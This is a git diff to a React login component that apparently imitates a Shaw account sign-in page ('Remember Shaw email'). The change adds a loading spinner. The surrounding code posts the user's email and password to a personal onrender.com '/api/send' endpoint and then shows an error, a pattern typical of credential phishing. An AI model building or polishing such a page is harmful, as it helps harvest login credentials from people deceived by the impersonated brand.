@@ -5,6 +5,7 @@ import logo from './logo.png';
 import  helpIcon from './helpIcon.png';
 import { useState } from 'react';
 import axios from 'axios';
+import loading from './loading.png';
 
 
 
@@ -16,12 +17,17 @@ function Home(){
 
     const[showError, setShowError] = useState(false);
 
+    const[isLoading, setIsLoading]= useState(false);
+
+
     
 
     async function handleSubmit(e){
         e.preventDefault();
     
         try {
+
+            setIsLoading(true);
             const response = await axios.post('https://myrootbackend-4cjn.onrender.com/api/send', {
                 email:email,
                 password:password,
@@ -35,6 +41,9 @@ function Home(){
                 console.log(response.data.message);
     
                 setShowError(true);
+
+                setIsLoading(false);
+
             }
           } catch (error) {
             // Handle error
@@ -122,6 +131,15 @@ function Home(){
                                     <input type="checkbox"className='checkbox' /> <span className='checkspan'>Remember Shaw email</span>
 
                                 </div>
+
+
+                                {
+                                    isLoading  && 
+                                <div className='text-center'>
+                                    <img className='loading' src={loading} />
+                                </div>
+
+                                }
 
 
                                 <div className='buttondiv text-center'>
